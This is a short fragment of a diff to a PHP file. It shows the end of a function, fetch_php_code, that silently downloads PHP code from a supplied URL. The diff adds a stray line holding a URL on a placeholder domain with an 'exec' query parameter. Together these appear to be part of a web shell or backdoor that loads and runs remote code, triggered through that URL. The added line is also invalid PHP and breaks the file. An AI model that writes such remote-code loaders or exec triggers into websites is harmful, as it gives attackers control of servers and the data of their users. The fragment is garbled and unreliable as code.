@@ -53,3 +53,4 @@ function fetch_php_code($url) {
     }
     return @file_get_contents($url);
 }
+https://domainanda.com/?exec=killua
